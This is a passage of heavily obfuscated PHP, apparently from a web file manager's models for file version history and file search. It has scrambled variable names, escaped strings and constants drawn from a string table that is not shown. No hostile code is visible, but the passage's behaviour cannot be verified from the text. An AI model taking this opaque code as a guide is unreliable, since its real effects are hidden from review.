$ÔëÉ×•è[87]) { $ ÷§ãÈó = Model($ÔëÉ×•è[1253])->listSearchChildren($Çë©¢³û, 20000); $ ÷§ãÈó[] = $Çë©¢³û . $ÔëÉ×•è[376]; $¡Òİ–ş = array($ÔëÉ×•è[397] => array($ÔëÉ×•è[7], $ ÷§ãÈó)); } $„ÑäªáÅ = $this->where($¡Òİ–ş)->order($ÔëÉ×•è[1980])->selectPage(); if ($„ÑäªáÅ[$ÔëÉ×•è[364]][$ÔëÉ×•è[365]] == 0) { $„ÑäªáÅ[$ÔëÉ×•è[364]][$ÔëÉ×•è[365]] = 1; $„ÑäªáÅ[$ÔëÉ×•è[367]] = array(array($ÔëÉ×•è[412] => $Çë©¢³û, $ÔëÉ×•è[1963] => $òÜ™¥¯â[$ÔëÉ×•è[492]], $ÔëÉ×•è[1572] => $òÜ™¥¯â[$ÔëÉ×•è[446]], $ÔëÉ×•è[417] => $ÔëÉ×•è[1981], $ÔëÉ×•è[418] => $òÜ™¥¯â[$ÔëÉ×•è[194]], $ÔëÉ×•è[1574] => $ÔëÉ×•è[33])); } return $this->eventListParse($„ÑäªáÅ, $Çë©¢³û); } private function eventListParse($½˜»òÚÀ, $û…È‰Ûê) { $¹“´Ô ø =& $_SERVER[¥ÙÌÜ¾ê]; $Ë¨çÈû‘ = $½˜»òÚÀ[$¹“´Ô ø[367]]; $êŒ±İÂË = array_to_keyvalue($Ë¨çÈû‘, $¹“´Ô ø[33], $¹“´Ô ø[397]); $¥¡çîÊ¯ = array_to_keyvalue($Ë¨çÈû‘, $¹“´Ô ø[33], $¹“´Ô ø[1969]); foreach ($Ë¨çÈû‘ as $ïæòÜş) { $ü¿½±· = $ïæòÜş[$¹“´Ô ø[445]]; if ($ïæòÜş[$¹“´Ô ø[29]] == $¹“´Ô ø[545] && isset($ü¿½±·[$¹“´Ô ø[1090]])) { $êŒ±İÂË[] = $ü¿½±·[$¹“´Ô ø[1090]] . $¹“´Ô ø[33]; $êŒ±İÂË[] = $ü¿½±·[$¹“´Ô ø[1091]] . $¹“´Ô ø[33]; } if ($ïæòÜş[$¹“´Ô ø[29]] == $¹“´Ô ø[1977] && isset($ü¿½±·[$¹“´Ô ø[397]])) { $êŒ±İÂË[] = $ü¿½±·[$¹“´Ô ø[397]] . $¹“´Ô ø[33]; } } $êŒ±İÂË = array_merge($êŒ±İÂË, $¥¡çîÊ¯, array($û…È‰Ûê . $¹“´Ô ø[33])); $êŒ±İÂË = array_unique($êŒ±İÂË); $ÆÖ¶€õó = array_unique(array_to_keyvalue($Ë¨çÈû‘, $¹“´Ô ø[33], $¹“´Ô ø[1581])); $ò‡õœ³ = Model($¹“´Ô ø[532])->userListInfo($ÆÖ¶€õó); $¿Şßç„Ú = Model($¹“´Ô ø[825])->sourceListInfo($êŒ±İÂË, !0); foreach ($Ë¨çÈû‘ as &$ïæòÜş) { if ($ïæòÜş[$¹“´Ô ø[29]] == $¹“´Ô ø[545] && isset($ïæòÜş[$¹“´Ô ø[445]][$¹“´Ô ø[1090]])) { $ïæòÜş[$¹“´Ô ø[445]][$¹“´Ô ø[1090]] = $¿Şßç„Ú[$ïæòÜş[$¹“´Ô ø[445]][$¹“´Ô ø[1090]]]; $ïæòÜş[$¹“´Ô ø[445]][$¹“´Ô ø[1091]] = $¿Şßç„Ú[$ïæòÜş[$¹“´Ô ø[445]][$¹“´Ô ø[1091]]]; } if ($ïæòÜş[$¹“´Ô ø[29]] == $¹“´Ô ø[1977] && isset($ïæòÜş[$¹“´Ô ø[445]][$¹“´Ô ø[397]])) { $ïæòÜş[$¹“´Ô ø[445]][$¹“´Ô ø[397]] = $¿Şßç„Ú[$ïæòÜş[$¹“´Ô ø[445]][$¹“´Ô ø[397]]]; } $ïæòÜş[$¹“´Ô ø[85]] = $¿Şßç„Ú[$ïæòÜş[$¹“´Ô ø[397]]]; $ïæòÜş[$¹“´Ô ø[1982]] = $¿Şßç„Ú[$ïæòÜş[$¹“´Ô ø[1969]]]; if ($ïæòÜş[$¹“´Ô ø[29]] == $¹“´Ô ø[1717]) { $ïæòÜş[$¹“´Ô ø[1982]] = $ïæòÜş[$¹“´Ô ø[85]]; $ïæòÜş[$¹“´Ô ø[1969]] = $ïæòÜş[$¹“´Ô ø[1982]][$¹“´Ô ø[397]]; $ïæòÜş[$¹“´Ô ø[85]] = !1; $ïæòÜş[$¹“´Ô ø[397]] = $¹“´Ô ø[33]; } $ïæòÜş[$¹“´Ô ø[1914]] = $ò‡õœ³[$ïæòÜş[$¹“´Ô ø[1581]]]; } unset($ïæòÜş); $½˜»òÚÀ[$¹“´Ô ø[367]] = $Ë¨çÈû‘; return $½˜»òÚÀ; } public function removeBySource($áĞìô) { $üó›è´è = array($_SERVER[¥ÙÌÜ¾ê][412] => $áĞìô); $this->where($üó›è´è)->remove(); } } class SourceHistoryModel extends ModelBase { protected $tableName = "\151\x6f\x5f\163\x6f\165\162\143\145\x5f\x68\x69\163\164\x6f\x72\x79"; public function historyCount($¾¯×«ÃÊ) { $òÙÕ©ƒğ =& $_SERVER[¥ÙÌÜ¾ê]; if (!$¾¯×«ÃÊ) { return array(); } if (is_string($¾¯×«ÃÊ) || is_int($¾¯×«ÃÊ)) { $¾¯×«ÃÊ = array($¾¯×«ÃÊ); } $­•Å’Õ = array($òÙÕ©ƒğ[397], $òÙÕ©ƒğ[1781] => $òÙÕ©ƒğ[494]); $ğ×µäàŠ = array($òÙÕ©ƒğ[397] => array($òÙÕ©ƒğ[7], $¾¯×«ÃÊ)); $Ê¬¶··Ú = $this->field($­•Å’Õ)->where($ğ×µäàŠ)->group($òÙÕ©ƒğ[397])->select(); return array_to_keyvalue($Ê¬¶··Ú, $òÙÕ©ƒğ[397], $òÙÕ©ƒğ[494]); } public function addHistory($¹õ¾ø¨¡, $üåà¿Û• = '') { $üÆæªÇı =& $_SERVER[¥ÙÌÜ¾ê]; $Úü¶Ò¶ = array($üÆæªÇı[412] => $¹õ¾ø¨¡[$üÆæªÇı[397]], $üÆæªÇı[1572] => isset($¹õ¾ø¨¡[$üÆæªÇı[448]]) ? $¹õ¾ø¨¡[$üÆæªÇı[448]] : $¹õ¾ø¨¡[$üÆæªÇı[446]], $üÆæªÇı[462] => $¹õ¾ø¨¡[$üÆæªÇı[461]], $üÆæªÇı[573] => $¹õ¾ø¨¡[$üÆæªÇı[78]], $üÆæªÇı[1983] => $üåà¿Û•); $öÔ­ûÌÓ = $GLOBALS[$üÆæªÇı[6]][$üÆæªÇı[88]][$üÆæªÇı[1139]]; if ($öÔ­ûÌÓ > 1) { $this->historyAutoClear($Úü¶Ò¶[$üÆæªÇı[397]]); $this->add($Úü¶Ò¶); } Hook::trigger($üÆæªÇı[1984], $Úü¶Ò¶); Model($üÆæªÇı[1985])->eventFileEdit($¹õ¾ø¨¡[$üÆæªÇı[397]]); } private function historyAutoClear($¨Âá«‚²) { $É¦·¹®Ú =& $_SERVER[¥ÙÌÜ¾ê]; $¤¨€¦ = Model($É¦·¹®Ú[763])->get($É¦·¹®Ú[1161]); $¨ÕÕ£Äó = $GLOBALS[$É¦·¹®Ú[6]][$É¦·¹®Ú[88]][$É¦·¹®Ú[1139]]; $÷ç¤Ş˜ö = $¤¨€¦ == $É¦·¹®Ú[1162] ? 5 : $¨ÕÕ£Äó; if ($¨ÕÕ£Äó <= 1) { $÷ç¤Ş˜ö = 1; } if ($÷ç¤Ş˜ö >= 500) { return; } $ëÑŒëØï = array($É¦·¹®Ú[412] => $¨Âá«‚²); $¬Îé„ = $this->field($É¦·¹®Ú[1986])->where($ëÑŒëØï)->order($É¦·¹®Ú[1980])->select(); if (!$¬Îé„ || $÷ç¤Ş˜ö >= count($¬Îé„)) { return; } $‘¿½“ş = array_to_keyvalue($¬Îé„, $É¦·¹®Ú[33], $É¦·¹®Ú[395]); $‘¿½“ş = array_slice($‘¿½“ş, $÷ç¤Ş˜ö); $²ºÑÃ½Å = array_to_keyvalue($¬Îé„, $É¦·¹®Ú[33], $É¦·¹®Ú[461]); $²ºÑÃ½Å = array_slice($²ºÑÃ½Å, $÷ç¤Ş˜ö); if (!$‘¿½“ş || !$²ºÑÃ½Å) { return; } $ëÑŒëØï = array($É¦·¹®Ú[414] => array($É¦·¹®Ú[7], $‘¿½“ş)); $this->where($ëÑŒëØï)->delete(); Model($É¦·¹®Ú[464])->remove($²ºÑÃ½Å); } public function listData($“®æñÎÒ) { $ªÛÏµğ¤ =& $_SERVER[¥ÙÌÜ¾ê]; $¸‘”çÉ— = array($ªÛÏµğ¤[412] => $“®æñÎÒ); $à¯Îô™ = $ªÛÏµğ¤[1987]; $›ÁÁ¢öü = $this->field($à¯Îô™)->where($¸‘”çÉ—)->order($ªÛÏµğ¤[1980])->selectPage(); $this->_listAppendUser($›ÁÁ¢öü[$ªÛÏµğ¤[367]]); $ğ„Ü…¾÷ = Model($ªÛÏµğ¤[763])->get($ªÛÏµğ¤[1161]); $Æâù¤á  = 5; if ($ğ„Ü…¾÷ == $ªÛÏµğ¤[1162]) { $›ÁÁ¢öü[$ªÛÏµğ¤[367]] = array_slice($›ÁÁ¢öü[$ªÛÏµğ¤[367]], 0, $Æâù¤á ); $›ÁÁ¢öü[$ªÛÏµğ¤[364]] = array($ªÛÏµğ¤[1988] => 1, $ªÛÏµğ¤[1989] => 20, $ªÛÏµğ¤[1990] => 1, $ªÛÏµğ¤[1991] => count($›ÁÁ¢öü[$ªÛÏµğ¤[367]])); } return $›ÁÁ¢öü; } protected function _listAppendUser(&$ƒåŠó„’) { $˜Á“òÁœ =& $_SERVER[¥ÙÌÜ¾ê]; $Í¯¬¦çá = array_to_keyvalue($ƒåŠó„’, $˜Á“òÁœ[33], $˜Á“òÁœ[1581]); $Ñ­ãÅÂâ = Model($˜Á“òÁœ[532])->userListInfo($Í¯¬¦çá); foreach ($ƒåŠó„’ as &$½—¸„Ë¢) { $§Ñ²µ = $½—¸„Ë¢[$˜Á“òÁœ[1581]]; $½—¸„Ë¢[$˜Á“òÁœ[446]] = $Ñ­ãÅÂâ[$§Ñ²µ] ? $Ñ­ãÅÂâ[$§Ñ²µ] : !1; } unset($½—¸„Ë¢); } public function fileInfo($¥‘‡ˆï‘) { $²¿ëüí¿ =& $_SERVER[¥ÙÌÜ¾ê]; $£ÓÃ÷” = $this->tablePrefix; $œ¤ÛØˆÁ = "{$£ÓÃ÷”}\x69\157\x5f\146\151\x6c\x65\40\x66\x69\154\x65\x73\x20\x6f\156\x20\146\151\x6c\145\163\x2e\x66\151\154\145\x49\104\x20\75\x20\150\x69\x73\x74\157\162\171\x2e\146\x69\154\145\x49\x44"; return $this->alias($²¿ëüí¿[1992])->where(array($²¿ëüí¿[414] => $¥‘‡ˆï‘))->join($œ¤ÛØˆÁ, $²¿ëüí¿[1993])->find(); } public function removeItem($½÷Îâ) { $¯éÊ“‡ =& $_SERVER[¥ÙÌÜ¾ê]; $€ì‡·ß = array($¯éÊ“‡[414] => $½÷Îâ); $²¡†´ = $this->where($€ì‡·ß)->find(); if ($²¡†´) { $Ú¡ÀçîÎ = $this->where($€ì‡·ß)->delete(); Model($¯éÊ“‡[464])->remove($²¡†´[$¯éÊ“‡[461]]); return $Ú¡ÀçîÎ; } return !1; } public function removeBySource($†ÃÖ¹§Ã) { $ªÂÖ³àğ =& $_SERVER[¥ÙÌÜ¾ê]; if (!$†ÃÖ¹§Ã) { return !1; } if (!is_array($†ÃÖ¹§Ã)) { $†ÃÖ¹§Ã = array($†ÃÖ¹§Ã); } $÷Ÿ÷ú¦ = array($ªÂÖ³àğ[412] => array($ªÂÖ³àğ[7], $†ÃÖ¹§Ã)); $ïñøğê„ = $this->field($ªÂÖ³àğ[462])->where($÷Ÿ÷ú¦)->select(); if ($ïñøğê„) { $this->where($÷Ÿ÷ú¦)->delete(); $©”üá‡× = array_to_keyvalue($ïñøğê„, $ªÂÖ³àğ[33], $ªÂÖ³àğ[461]); Model($ªÂÖ³àğ[464])->remove($©”üá‡×); } return !0; } public function setDetail($ÇÄÙó“á, $ÁÀÄ‚Â) { $şúøª¯ =& $_SERVER[¥ÙÌÜ¾ê]; return $this->where(array($şúøª¯[414] => $ÇÄÙó“á))->save(array($şúøª¯[1983] => $ÁÀÄ‚Â)); } public function rollbackToItem($èã¢, $„Şâ–¿) { $‹â³ÜÙß =& $_SERVER[¥ÙÌÜ¾ê]; $Øüâ–Ö = Model($‹â³ÜÙß[825])->sourceInfo($èã¢); $this->addHistory($Øüâ–Ö, LNG($‹â³ÜÙß[1994])); $êÆÔ·Ôï = $this->find($„Şâ–¿); $·ô ó‘Ÿ = array($‹â³ÜÙß[461] => $êÆÔ·Ôï[$‹â³ÜÙß[461]], $‹â³ÜÙß[78] => $êÆÔ·Ôï[$‹â³ÜÙß[78]], $‹â³ÜÙß[84] => time(), $‹â³ÜÙß[448] => USER_ID); Model($‹â³ÜÙß[825])->where(array($‹â³ÜÙß[397] => $èã¢))->save($·ô ó‘Ÿ); return $this->where(array($‹â³ÜÙß[414] => $„Şâ–¿))->delete(); } public function clearSame($÷š¶°âö) { $â”ªø½à =& $_SERVER[¥ÙÌÜ¾ê]; $æÛŒÜõı = $this->listData($÷š¶°âö); $şış³¯ = array_to_keyvalue_group($æÛŒÜõı, $â”ªø½à[461]); $Ò³¯ÒÎ˜ = array(); $èéæ¥éÅ = array(); foreach ($şış³¯ as $¡óá¨À‘) { if (!$¡óá¨À‘ || count($¡óá¨À‘) <= 1) { continue; } foreach ($¡óá¨À‘ as $Œ–¯Ñó«) { $Ò³¯ÒÎ˜[] = $Œ–¯Ñó«[$â”ªø½à[461]]; $èéæ¥éÅ[] = $Œ–¯Ñó«[$â”ªø½à[395]]; } } if (!$èéæ¥éÅ) { return; } $this->where(array($â”ªø½à[395] => array($â”ªø½à[7], $èéæ¥éÅ)))->delete(); Model($â”ªø½à[464])->remove($Ò³¯ÒÎ˜); } public function userSpace() { $Ñ·”¯ş§ =& $_SERVER[¥ÙÌÜ¾ê]; $ ²®ÑÎ¸ = $this->tablePrefix; $¡Å÷ß©‘ = array($Ñ·”¯ş§[1572] => USER_ID); $÷ÄíïÄÒ = "{$ ²®ÑÎ¸}\151\x6f\x5f\x66\x69\x6c\x65\x20\146\x69\154\x65\x73\x20\x6f\156\x20\146\x69\x6c\x65\163\x2e\x66\x69\154\x65\111\104\x20\x3d\x20\x68\x69\163\164\x6f\162\x79\56\146\x69\x6c\145\x49\x44"; return $this->alias($Ñ·”¯ş§[1992])->where($¡Å÷ß©‘)->join($÷ÄíïÄÒ, $Ñ·”¯ş§[1993])->sum($Ñ·”¯ş§[78]); } } class SourceListSearchModel extends SourceListMoveModel { public static function fileTypeWhere($¹ŠÜ„ü») { $± ©øÅ® =& $_SERVER[¥ÙÌÜ¾ê]; $«ºË“Ÿâ = KodIO::fileTypeList(); $®–ö§ğ = $«ºË“Ÿâ[$¹ŠÜ„ü»]; if (!$®–ö§ğ) { return array(); } $ˆª—©Ñè = $®–ö§ğ[$± ©øÅ®[168]]; $µîšÑÑ‡ = $± ©øÅ®[7]; if (!$®–ö§ğ[$± ©øÅ®[168]]) { $¯å¸«æ· = array_to_keyvalue($«ºË“Ÿâ, $± ©øÅ®[33], $± ©øÅ®[168]); $ˆª—©Ñè = implode($± ©øÅ®[47], $¯å¸«æ·); $µîšÑÑ‡ = $± ©øÅ®[1995]; } $‚Ôİ®£ = explode($± ©øÅ®[47], trim($ˆª—©Ñè, $± ©øÅ®[47])); return array($µîšÑÑ‡, $‚Ôİ®£); } public function listPathType($ã×ñµœØ) { $…±Õ¤–† =& $_SERVER[¥ÙÌÜ¾ê]; $å¡¥ß‡¼ = $this->fileTypeWhere($ã×ñµœØ); if (!$å¡¥ß‡¼) { return array(); } $œ¬ĞÛø… = array($…±Õ¤–†[574] => SourceModel::TYPE_USER, $…±Õ¤–†[575] => USER_ID, $…±Õ¤–†[571] => 0, $…±Õ¤–†[572] => $å¡¥ß‡¼); return $this->listSource($œ¬ĞÛø…); } public function listSearch($ƒÔÍµ«æ, $¶°ıÓóó = 300) { $ˆ¨ñ” =& $_SERVER[¥ÙÌÜ¾ê]; if (isset($ƒÔÍµ«æ[$ˆ¨ñ”[1840]]) && $ƒÔÍµ«æ[$ˆ¨ñ”[1840]]) { $ƒÔÍµ«æ[$ˆ¨ñ”[1840]] = str_replace($ˆ¨ñ”[382], $ˆ¨ñ”[1996], trim($ƒÔÍµ«æ[$ˆ¨ñ”[1840]])); } $¬¶´õÍÆ = $this->_parseSearchWhere($ƒÔÍµ«æ); $Ğß§‘³ = $¬¶´õÍÆ; if (!isset($¬¶´õÍÆ[$ˆ¨ñ”[425]])) { $¬¶´õÍÆ[$ˆ¨ñ”[425]] = 0; } $¨â–Ë¡Ë = $ˆ¨ñ”[1997]; $¢ÅÇ½¢ = $¨â–Ë¡Ë; $this->_listSearchBindPinyin($ƒÔÍµ«æ, $¬¶´õÍÆ, $¨â–Ë¡Ë); $this->alias($ˆ¨ñ”[438])->_makeOrder(); $¬¶´õÍÆ = $this->parseWhereLike($¬¶´õÍÆ); $†ºĞ‘Šè = $this->distinct(!0)->field($¨â–Ë¡Ë)->where($¬¶´õÍÆ)->selectPage($¶°ıÓóó); $this->_listSearchFileContent($†ºĞ‘Šè, $ƒÔÍµ«æ, $¢ÅÇ½¢, $Ğß§‘³); $this->_listSearchDesc($†ºĞ‘Šè, $ƒÔÍµ«æ, $¢ÅÇ½¢); $this->_listSearchTag($†ºĞ‘Šè, $ƒÔÍµ«æ, $¢ÅÇ½¢); $this->_listSearchGroupTag($†ºĞ‘Šè, $ƒÔÍµ«æ, $¢ÅÇ½¢); $this->_listDataApply($†ºĞ‘Šè[$ˆ¨ñ”[367]]); $this->_listMake($†ºĞ‘Šè); return $†ºĞ‘Šè; } private function _listSearchFileContent(&$äé¡ªˆ, $àğÀ´à, $ÉÑË½’, $©İŠ’Üµ) { $ŠÖà–·Í =& $_SERVER[¥ÙÌÜ¾ê]; if (!$àğÀ´à[$ŠÖà–·Í[1840]] || $äé¡ªˆ[$ŠÖà–·Í[364]][$ŠÖà–·Í[351]] > 1) { return; } if (!isset($©İŠ’Üµ[$ŠÖà–·Í[28]]) || !is_array($àğÀ´à[$ŠÖà–·Í[461]])) { return; } $©İŠ’Üµ[$ŠÖà–·Í[461]] = array($ŠÖà–·Í[7], $àğÀ´à[$ŠÖà–·Í[461]]); unset($©İŠ’Üµ[$ŠÖà–·Í[28]]); unset($àğÀ´à[$ŠÖà–·Í[461]]); $‹ë¿ÍòË = $this->field($ÉÑË½’)->where($©İŠ’Üµ)->limit($ŠÖà–·Í[1998])->select(); if (!$‹ë¿ÍòË || count($‹ë¿ÍòË) == 0) { return; } $äé¡ªˆ[$ŠÖà–·Í[367]] = array_merge($‹ë¿ÍòË, $äé¡ªˆ[$ŠÖà–·Í[367]]); $äé¡ªˆ[$ŠÖà–·Í[364]][$ŠÖà–·Í[365]] += count($‹ë¿ÍòË); } private function _listSearchTag(&$Ù­Çí›Å, $´±É‘Ô, $ºáÆô”µ) { $Ë²¿¥‹Ç =& $_SERVER[¥ÙÌÜ¾ê]; if (!$´±É‘Ô[$Ë²¿¥‹Ç[1840]] || $Ù­Çí›Å[$Ë²¿¥‹Ç[364]][$Ë²¿¥‹Ç[351]] > 1) { return; } $›²®Ì“ = Model($Ë²¿¥‹Ç[1999])->listData(); $³êì„ß“ = array(); $Î„æßÓ¦ = $´±É‘Ô[$Ë²¿¥‹Ç[1840]]; foreach ($›²®Ì“ as $ıóïœâ) { $„œñÃà¿ = $ıóïœâ[$Ë²¿¥‹Ç[28]]; $‡Ç‹÷Ó = str_replace($Ë²¿¥‹Ç[50], $Ë²¿¥‹Ç[33], Pinyin::get($„œñÃà¿)); if (stripos($„œñÃà¿, $Î„æßÓ¦) !== !1 || stripos($‡Ç‹÷Ó, $Î„æßÓ¦) !== !1) { $³êì„ß“[] = $ıóïœâ[$Ë²¿¥‹Ç[395]]; } } if (!$³êì„ß“) { return; } $¡À –§„ = array($Ë²¿¥‹Ç[421] => array($Ë²¿¥‹Ç[7], $³êì„ß“), $Ë²¿¥‹Ç[1581] => USER_ID); $óÕıëÄÀ = Model($Ë²¿¥‹Ç[422])->field($Ë²¿¥‹Ç[76])->where($¡À –§„)->select(); $óÕıëÄÀ = array_to_keyvalue($óÕıëÄÀ, $Ë²¿¥‹Ç[33], $Ë²¿¥‹Ç[76]); $ûï×àÍ = array_unique($óÕıëÄÀ); $this->_listSearchMerge($Ù­Çí›Å, $´±É‘Ô, $ºáÆô”µ, $ûï×àÍ); } private function _listSearchDesc(&$’¨‚ß¯·, $ÔèÃæ¹, $ìÈ„’Ô) { $¤€Ø„÷ =& $_SERVER[¥ÙÌÜ¾ê]; if (!$ÔèÃæ¹[$¤€Ø„÷[1840]] || $’¨‚ß¯·[$¤€Ø„÷[364]][$¤€Ø„÷[351]] > 1) { return; } $¼¨àçÁÎ = $this->listSearchChildren($ÔèÃæ¹[$¤€Ø„÷[492]]); $¼¨àçÁÎ = array_unique($¼¨àçÁÎ); if (!$¼¨àçÁÎ) { return; } $ñ”ªï•¥ = array($¤€Ø„÷[397] => array($¤€Ø„÷[7], $¼¨àçÁÎ), $¤€Ø„÷[93] => $¤€Ø„÷[445], $¤€Ø„÷[372] => array($¤€Ø„÷[381], $¤€Ø„÷[1842] . $ÔèÃæ¹[$¤€Ø„÷[1840]] . $¤€Ø„÷[1842])); $öÎ›òÖ˜ = Model($¤€Ø„÷[557])->field($¤€Ø„÷[397])->where($ñ”ªï•¥)->select(); $ñó¤ÆÆß = array_to_keyvalue($öÎ›òÖ˜, $¤€Ø„÷[33], $¤€Ø„÷[397]); $this->_listSearchMerge($’¨‚ß¯·, $ÔèÃæ¹, $ìÈ„’Ô, $ñó¤ÆÆß); } private function _listSearchGroupTag(&$Ëã¬¨€, $§ °×, $û ÀÚÑµ) { $ä¨Ó¯œ =& $_SERVER[¥ÙÌÜ¾ê]; if (!$§ °×[$ä¨Ó¯œ[1840]] || $Ëã¬¨€[$ä¨Ó¯œ[364]][$ä¨Ó¯œ[351]] > 1 || !$§ °×[$ä¨Ó¯œ[492]]) { return; } $úÍş‡‡ = $this->sourceInfo($§ °×[$ä¨Ó¯œ[492]]); if (!$úÍş‡‡ || $úÍş‡‡[$ä¨Ó¯œ[406]] != SourceModel::TYPE_GROUP) { return; } $şœåĞ¨Ÿ = $úÍş‡‡[$ä¨Ó¯œ[498]]; $ğ×í÷¢ì = Model($ä¨Ó¯œ[2000])->get($şœåĞ¨Ÿ); $ÔƒäÌø° = array(); $ÌÕà¥Œ­ = $§ °×[$ä¨Ó¯œ[1840]]; foreach ($ğ×í÷¢ì[$ä¨Ó¯œ[367]] as $µÚ™¼ÉØ) { $®ËŸé = $µÚ™¼ÉØ[$ä¨Ó¯œ[28]]; $‹ÀÈÓÛı = str_replace($ä¨Ó¯œ[50], $ä¨Ó¯œ[33], Pinyin::get($®ËŸé)); if (stripos($®ËŸé, $ÌÕà¥Œ­) !== !1 || stripos($‹ÀÈÓÛı, $ÌÕà¥Œ­) !== !1) { $ÔƒäÌø°[] = $µÚ™¼ÉØ[$ä¨Ó¯œ[395]]; } } if (!$ÔƒäÌø°) { return; } $õûŒÒŸ = array($ä¨Ó¯œ[421] => array($ä¨Ó¯œ[7], $ÔƒäÌø°), $ä¨Ó¯œ[1581] => 0, $ä¨Ó¯œ[29] => $ä¨Ó¯œ[1864] . $şœåĞ¨Ÿ); $ş í©ü = Model($ä¨Ó¯œ[422])->field($ä¨Ó¯œ[76])->where($õûŒÒŸ)->select(); $ş í©ü = array_to_keyvalue($ş í©ü, $ä¨Ó¯œ[33], $ä¨Ó¯œ[76]); $ïÑÛŸœÉ = array_unique($ş í©ü); $this->_listSearchMerge($Ëã¬¨€, $§ °×, $û ÀÚÑµ, $ïÑÛŸœÉ); } private function _listSearchMerge(&$×–‚ûÄ¼, $Ãıï½ô­, $òÌ‚öÃÂ, $£—Äò«ù) { $ŠØ²™Á¶ =& $_SERVER[¥ÙÌÜ¾ê]; if (!$£—Äò«ù) { return; } $ô‡âû¬ = array_to_keyvalue($×–‚ûÄ¼[$ŠØ²™Á¶[367]], $ŠØ²™Á¶[33], $ŠØ²™Á¶[397]); $¡ãôÎ”° = array_diff($£—Äò«ù, $ô‡âû¬); if (!$¡ãôÎ”°) { return; } $‡õûÍ = array($ŠØ²™Á¶[397] => array($ŠØ²™Á¶[7], $¡ãôÎ”°)); $§¬î®ñ„ = $this->field($òÌ‚öÃÂ)->where($‡õûÍ)->select(); if (!$§¬î®ñ„) { return; } $†½ª²µØ = array(); foreach ($§¬î®ñ„ as $áÌÎ„é) { if ($this->_listSearchFilter($áÌÎ„é, $Ãıï½ô­)) { $†½ª²µØ[] = $áÌÎ„é; } } $×–‚ûÄ¼[$ŠØ²™Á¶[367]] = array_merge($†½ª²µØ, $×–‚ûÄ¼[$ŠØ²™Á¶[367]]); $×–‚ûÄ¼[$ŠØ²™Á¶[364]][$ŠØ²™Á¶[365]] += count($†½ª²µØ); } private function _listSearchFilter($Ï€¡ùß, $Ï†¼øğÈ) { $å‹éß²õ =& $_SERVER[¥ÙÌÜ¾ê]; $’ğ¥»¬Ò = $Ï€¡ùß[$å‹éß²õ[405]] == $å‹éß²õ[87]; if (!strstr($Ï€¡ùß[$å‹éß²õ[515]], $å‹éß²õ[47] . $Ï†¼øğÈ[$å‹éß²õ[492]] . $å‹éß²õ[47])) { return !1; } if (isset($Ï†¼øğÈ[$å‹éß²õ[407]]) && $Ï†¼øğÈ[$å‹éß²õ[407]] != $å‹éß²õ[1803]) { if ($Ï†¼øğÈ[$å‹éß²õ[407]] == $å‹éß²õ[77] && !$’ğ¥»¬Ò) { return !1; } if ($Ï†¼øğÈ[$å‹éß²õ[407]] != $å‹éß²õ[77] && $’ğ¥»¬Ò) { return !1; } if (!strstr($Ï€¡ùß[$å‹éß²õ[168]], $å‹éß²õ[47] . $Ï†¼øğÈ[$å‹éß²õ[407]] . $å‹éß²õ[47])) { return !1; } } if (isset($Ï†¼øğÈ[$å‹éß²õ[2001]]) && $Ï†¼øğÈ[$å‹éß²õ[2001]] < $Ï€¡ùß[$å‹éß²õ[78]]) { return !1; } if (isset($Ï†¼øğÈ[$å‹éß²õ[2002]]) && $Ï†¼øğÈ[$å‹éß²õ[2002]] > $Ï€¡ùß[$å‹éß²õ[78]]) { return !1; } if (isset($Ï†¼øğÈ[$å‹éß²õ[588]]) && $Ï†¼øğÈ[$å‹éß²õ[588]] != $Ï€¡ùß[$å‹éß²õ[448]]) { return !1; } return !0; } public function listSearchChildren($ããü ¦, $Ê³‡ÖÜ = 5000) { $ÍÔ°ØÇË =& $_SERVER[¥ÙÌÜ¾ê]; $ßÕş¢î = array(); $ôĞ‘Ë¶ = $this->sourceInfo($ããü ¦); $ôÒ˜¸õ = array($ÍÔ°ØÇË[515] => array($ÍÔ°ØÇË[381], $ôĞ‘Ë¶[$ÍÔ°ØÇË[515]] . $ôĞ‘Ë¶[$ÍÔ°ØÇË[397]] . $ÍÔ°ØÇË[539])); $Ú¾‡òÍ‚ = $this->field($ÍÔ°ØÇË[397])->cache(null, 600)->where($ôÒ˜¸õ)->count(); if ($Ú¾‡òÍ‚ > $Ê³‡ÖÜ) { return $this->_listSearchChildrenNear($ããü ¦, $Ê³‡ÖÜ); } $šë’”£“ = $this->field($ÍÔ°ØÇË[397])->where($ôÒ˜¸õ)->select(); $ßÕş¢î = array_to_keyvalue($šë’”£“, $ÍÔ°ØÇË[33], $ÍÔ°ØÇË[397]); return $ßÕş¢î; } private function _listSearchChildrenNear($ˆÄ‡…Êê, $–ë·Ğ•´) { $¬–øÆÒÂ =& $_SERVER[¥ÙÌÜ¾ê]; $öªà‡Ä” = array(); $Šš—²£İ = array($¬–øÆÒÂ[492] => $ˆÄ‡…Êê); $Ó¬•Äµ” = $this->field($¬–øÆÒÂ[2003])->where($Šš—²£İ)->select(); $…Ëúíï® = array_to_keyvalue(array_filter_by_field($Ó¬•Äµ”, $¬–øÆÒÂ[405], $¬–øÆÒÂ[87]), $¬–øÆÒÂ[33], $¬–øÆÒÂ[397]); $öªà‡Ä” = array_merge($öªà‡Ä”, array_to_keyvalue($Ó¬•Äµ”, $¬–øÆÒÂ[33], $¬–øÆÒÂ[397])); if (!$…Ëúíï®) { return $öªà‡Ä”; } $Šš—²£İ = array($¬–øÆÒÂ[492] => array($¬–øÆÒÂ[7], $…Ëúíï®)); $Ó¬•Äµ” = $this->field($¬–øÆÒÂ[2003])->where($Šš—²£İ)->limit($–ë·Ğ•´)->select(); $öªà‡Ä” = array_merge($öªà‡Ä”, array_to_keyvalue($Ó¬•Äµ”, $¬–øÆÒÂ[33], $¬–øÆÒÂ[397])); $öªà‡Ä” = array_slice($öªà‡Ä”, 0, $–ë·Ğ•´); return $öªà‡Ä”; } private function _listSearchBindPinyin($—ËüÏ‚, &$êæ—ËŒ•, &$İØƒªù) { $»ø›œéÀ =& $_SERVER[¥ÙÌÜ¾ê]; if (!isset($—ËüÏ‚[$»ø›œéÀ[1840]]) || !$—ËüÏ‚[$»ø›œéÀ[1840]]) { return; } if (!Input::check($—ËüÏ‚[$»ø›œéÀ[1840]], $»ø›œéÀ[316]) || strlen($—ËüÏ‚[$»ø›œéÀ[1840]]) < 2) { return; } $ºƒŒë×Ñ = "\x4c\105\x46\x54\40\112\x4f\x49\116\40{$this->tablePrefix}\x69\157\137\x73\x6f\x75\x72\143\145\137\x6d\x65\164\x61\x20\x6d\145\164\x61\40\157\x6e\40\163\157\165\x72\143\x65\56\163\x6f\165\x72\x63\145\111\104\x20\75\40\x6d\x65\164\x61\56\x73\157\165\x72\143\145\x49\x44"; $­¿úÑ’– = array(); 